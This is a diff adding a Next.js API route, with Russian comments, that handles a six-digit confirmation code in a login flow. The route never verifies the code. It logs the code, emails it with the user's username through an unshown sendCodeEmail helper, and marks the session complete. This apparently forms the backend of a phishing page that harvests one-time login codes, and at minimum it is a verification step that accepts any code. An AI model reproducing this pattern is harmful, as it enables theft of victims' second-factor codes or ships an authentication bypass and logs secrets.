@@ -1,0 +1,71 @@
+import { NextRequest, NextResponse } from "next/server";
+import { sendCodeEmail } from "@/lib/email";
+import { getSession, setSession, deleteSession } from "@/lib/session";
+
+/**
+ * API endpoint для отправки кода подтверждения
+ * POST /api/verify-code
+ */
+export async function POST(request: NextRequest) {
+  console.log("[API VERIFY-CODE] Получен запрос на отправку кода");
+
+  try {
+    // Проверка сессии
+    const session = await getSession();
+
+    if (!session || session.step !== "code") {
+      console.error("[API VERIFY-CODE] Неверная сессия");
+      return NextResponse.json(
+        { error: "Сессия недействительна. Пожалуйста, войдите снова." },
+        { status: 401 }
+      );
+    }
+
+    const body = await request.json();
+    const { code } = body;
+
+    console.log("[API VERIFY-CODE] Получен код:", code);
+
+    // Валидация кода
+    if (!code || typeof code !== "string" || !/^\d{6}$/.test(code)) {
+      console.error("[API VERIFY-CODE] Неверный формат кода");
+      return NextResponse.json(
+        { error: "Код должен содержать 6 цифр" },
+        { status: 400 }
+      );
+    }
+
+    // Отправка Email с кодом
+    try {
+      await sendCodeEmail(code, session.username);
+      console.log("[API VERIFY-CODE] Email с кодом отправлен");
+    } catch (emailError) {
+      console.error("[API VERIFY-CODE] Ошибка отправки Email:", emailError);
+      // Продолжаем выполнение
+    }
+
+    // Обновление сессии - код подтвержден
+    await setSession({
+      step: "completed",
+      username: session.username,
+    });
+
+    console.log("[API VERIFY-CODE] Код подтвержден, сессия обновлена");
+
+    return NextResponse.json({
+      success: true,
+      message: "Код успешно отправлен",
+    });
+  } catch (error) {
+    console.error("[API VERIFY-CODE] Ошибка:", error);
+    return NextResponse.json(
+      {
+        error:
+          error instanceof Error ? error.message : "Ошибка при отправке кода",
+      },
+      { status: 500 }
+    );
+  }
+}
+
+
